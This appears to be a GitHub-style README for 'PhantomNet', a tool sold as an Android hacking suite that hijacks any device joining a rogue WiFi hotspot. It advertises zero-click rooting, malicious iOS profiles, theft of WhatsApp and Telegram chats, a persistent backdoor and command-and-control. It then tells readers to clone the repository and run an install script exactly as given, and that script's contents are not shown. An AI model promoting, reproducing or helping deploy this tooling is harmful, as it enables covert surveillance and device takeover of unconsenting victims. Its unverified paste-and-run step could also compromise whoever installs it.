# PhantomNet - Android Hacking Suite 
*By Veran350*

Turn your Android phone into a WiFi hacking machine. Controls any device connecting to "PhantomNet" WiFi.

## :zap: Features
- Auto-root Android 8-13 via zero-click exploit
- Jailbreak iOS 14-16.6.1 with malicious profile
- Real-time screen mirroring
- Steal WhatsApp/Telegram chats
- Survives reboot (persistent backdoor)
- Encrypted C2 communication

- ## :package: Requirements  
1. **Android 8.0+**  
   - Install [Termux](https://f-droid.org/repo/com.termux_118.apk)  
2. **1GB Storage**  

---

## :wrench: Step-by-Step Setup  

### Step 1: Install Termux  
1. Download and install Termux from the link above.  
2. Open Termux and allow **storage permissions** when prompted.  

### Step 2: Run These Commands *Exactly*  
```bash  
termux-setup-storage  
pkg install git -y  
git clone https://github.com/Veran350/PhantomNet  
cd PhantomNet  
./scripts/install.sh  
